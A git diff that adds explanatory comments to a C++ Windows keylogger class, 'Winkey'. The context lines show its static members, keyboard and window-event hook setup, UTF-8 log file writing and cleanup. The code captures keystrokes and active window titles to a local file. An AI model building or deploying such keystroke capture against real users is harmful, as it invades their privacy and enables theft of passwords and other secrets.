@@ -1,10 +1,12 @@
 #include "Winkey.hpp"
 
+// Declare the attributes which are used by the static methods
 std::wofstream	Winkey::_logFile;
 wchar_t			Winkey::_windowTitle[TW_WINTITLE_MAX];
 HWND		    Winkey::_currentWindow;
 wchar_t         Winkey::_keyStroke[TW_KEYSTROKE_MAX];
 
+// Check if the character is a printable unicode character
 bool Winkey::isPrintable(wchar_t c) {
     return (c >= 0x20 && (c < 0x7F || c >= 0xA0));
 }
@@ -18,7 +20,9 @@ Winkey::Winkey(): _logFileName(TW_LOGFILE) {
     // Open the outfile in appending mode
     _logFile.open(TW_LOGFILE, std::ios::app);
     if (!_logFile.is_open()) throw FileOpenFailureException();
-
+    
+    // Tell std::wofstream to use UTF-8 encoding when writing wide
+    //  characters (wchar_t) to the file.
     _logFile.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));
 
     // Set window and keyboard hooks
@@ -27,6 +31,7 @@ Winkey::Winkey(): _logFileName(TW_LOGFILE) {
     }
 }
 
+// Set hooks to intercept events
 void Winkey::setHooks() {
     // Set the event hook for foreground window changes (out-of-context)
     _winEventHook = SetWinEventHook(
@@ -43,6 +48,7 @@ void Winkey::setHooks() {
     if (!_keyboardHook) throw HookSettingFailureException();
 }
 
+// Run the main loop of the program
 void Winkey::run() {
     /*
      * Main message loop
@@ -232,6 +238,7 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+// This desctructor cleans up before leaving
 Winkey::~Winkey() {
     if (_winEventHook)          UnhookWinEvent(_winEventHook);
     if (_keyboardHook)          UnhookWindowsHookEx(_keyboardHook);
